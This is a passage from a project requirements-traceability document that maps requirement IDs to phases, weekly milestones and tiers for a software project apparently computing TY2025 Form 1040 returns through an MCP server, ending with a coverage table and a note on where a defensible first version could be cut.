| DOC-14 | T1 | Phase 5 - Document Base and First Dialects | Week 1 | Complete |
| DOC-15 | T2 | Phase 11 - Wage, Retirement, Benefit Documents | Week 3 | Pending |
| DOC-16 | T3 | Phase 15 - Realism Polish and Upstream | Week 5 | Pending |
| DOC-17 | T2 | Phase 5 - Document Base and First Dialects (added) | Week 1 | Complete |
| EXACT-01 | T0 | Phase 4 - Exact Arithmetic | Week 1 | Done |
| EXACT-02 | T0 | Phase 4 - Exact Arithmetic | Week 1 | Done |
| EXACT-03 | T0 | Phase 4 - Exact Arithmetic | Week 1 | Done |
| EXACT-04 | T0 | Phase 4 - Exact Arithmetic | Week 1 | Done |
| EXACT-05 | T1 | Phase 4 - Exact Arithmetic | Week 1 | Done |
| TAX-01 | T1 | Phase 8 - TY2025 Parameters and Tax Table | Week 2 | Pending |
| TAX-02 | T1 | Phase 8 - TY2025 Parameters and Tax Table | Week 2 | Pending |
| TAX-03 | T1 | Phase 10 - 1040 Core and Scope Guard | Week 2 | Pending |
| TAX-04 | T1 | Phase 8 - TY2025 Parameters and Tax Table | Week 2 | Pending |
| TAX-05 | T1 | Phase 10 - 1040 Core and Scope Guard | Week 2 | Pending |
| TAX-06 | T1 | Phase 10 - 1040 Core and Scope Guard | Week 2 | Pending |
| TAX-07 | T2 | Phase 12 - Brokerage and Capital-Gain Chain | Week 3 | Pending |
| TAX-08 | T2 | Phase 12 - Brokerage and Capital-Gain Chain | Week 3 | Pending |
| TAX-09 | T2 | Phase 13 - The 65+ Profile and Schedules | Week 3 | Pending |
| TAX-10 | T2 | Phase 13 - The 65+ Profile and Schedules | Week 3 | Pending |
| TAX-11 | T2 | Phase 12 - Brokerage and Capital-Gain Chain | Week 3 | Pending |
| TAX-12 | T2 | Phase 13 - The 65+ Profile and Schedules | Week 3 | Pending |
| TAX-13 | T2 | Phase 13 - The 65+ Profile and Schedules | Week 3 | Pending |
| TAX-14 | T2 | Phase 13 - The 65+ Profile and Schedules | Week 3 | Pending |
| TAX-15 | T2 | Phase 12 - Brokerage and Capital-Gain Chain | Week 3 | Pending |
| TAX-16 | T1 | Phase 10 - 1040 Core and Scope Guard | Week 2 | Pending |
| TAX-17 | T3 | Phase 15 - Realism Polish and Upstream | Week 5 | Pending |
| PROV-01 | T1 | Phase 9 - Traceable Report Lines | Week 2 | Pending |
| PROV-02 | T1 | Phase 9 - Traceable Report Lines | Week 2 | Pending |
| PROV-03 | T1 | Phase 7 - `fjs_run` and Run Records | Week 1 | Pending |
| PROV-04 | T2 | Phase 14 - Acceptance | Week 4 | Pending |
| PROV-05 | T2 | Phase 14 - Acceptance | Week 4 | Pending |
| PROV-06 | T3 | Phase 15 - Realism Polish and Upstream | Week 5 | Pending |
| PROV-07 | T2 | Phase 9 - Traceable Report Lines | Week 2 | Pending |
| PROV-08 | T3 | Phase 15 - Realism Polish and Upstream | Week 5 | Pending |
| SEC-01 | T0 | Phase 2 - Server Skeleton and Registration | Week 0 | Done |
| SEC-02 | T1 | Phase 6 - Guest ABI and Materialization | Week 1 | Complete |
| SEC-03 | T1 | Phase 6 - Guest ABI and Materialization | Week 1 | Complete |
| SEC-04 | T0 | Phase 1 - Planning-Document Corrections | Week 0 | Done |

### Coverage by phase

| Phase | Milestone | Requirements | Count | Tiers |
|-------|-----------|--------------|-------|-------|
| 1. Planning-Document Corrections | Week 0 | DOCC-01, DOCC-02, DOCC-03, DOCC-04, DOCC-05, DOCC-06, DOCC-07, SEC-04 | 8 | T0 |
| 2. Server Skeleton and Registration | Week 0 | MCP-01, MCP-02, MCP-03, MCP-04, MCP-05, SEC-01, DOC-02 | 7 | T0 |
| 3. The Restricted Interpreter | Week 1 | EXEC-01, EXEC-02, EXEC-03, EXEC-04, EXEC-05, EXEC-06 | 6 | T0 |
| 4. Exact Arithmetic | Week 1 | EXACT-01, EXACT-02, EXACT-03, EXACT-04, EXACT-05 | 5 | T0, T1 |
| 5. Document Base and First Dialects | Week 1 | DOC-00, DOC-01, DOC-03, DOC-04, DOC-05, DOC-10, DOC-11, DOC-12, DOC-14, DOC-17 | 10 | T0, T1, T2 |
| 6. Guest ABI and Materialization | Week 1 | EXEC-07, EXEC-09, SEC-02, SEC-03 | 4 | T0, T1 |
| 7. `fjs_run` and Run Records | Week 1 | EXEC-08, EXEC-10, EXEC-11, EXEC-12, PROV-03, MCP-06 | 6 | T1 |
| 8. TY2025 Parameters and Tax Table | Week 2 | TAX-01, TAX-02, TAX-04, MCP-07 | 4 | T1 |
| 9. Traceable Report Lines | Week 2 | PROV-01, PROV-02, PROV-07 | 3 | T1, T2 |
| 10. 1040 Core and Scope Guard | Week 2 | TAX-03, TAX-05, TAX-06, TAX-16 | 4 | T1 |
| 11. Wage, Retirement, Benefit Documents | Week 3 | DOC-08, DOC-09, DOC-15, MCP-08 | 4 | T2 |
| 12. Brokerage and Capital-Gain Chain | Week 3 | DOC-06, DOC-07, DOC-13, TAX-07, TAX-08, TAX-11, TAX-15 | 7 | T2 |
| 13. The 65+ Profile and Schedules | Week 3 | TAX-09, TAX-10, TAX-12, TAX-13, TAX-14 | 5 | T2 |
| 14. Acceptance | Week 4 | EXEC-13, PROV-04, PROV-05 | 3 | T2 |
| 15. Realism Polish and Upstream | Week 5 | MCP-09, DOC-16, TAX-17, PROV-06, PROV-08 | 5 | T3 |

**Cut line.** Phases 1-10 constitute a defensible v1 - the scope guard (TAX-16) is what
makes a partial 1040 honest rather than quietly wrong. Phases 11-13 complete the declared
taxpayer profile, and Phase 14's acceptance test cannot pass without them: a 65+ TY2025
return that omits Schedule 1-A is structurally wrong, not merely incomplete. See
ROADMAP.md "Scope Honesty and the Cut Line".

---
*Scoped 2026-08-03 from PROJECT.md, todo/plan.md, and the research corpus. Tier labels
indicate sequencing pressure, not importance.*
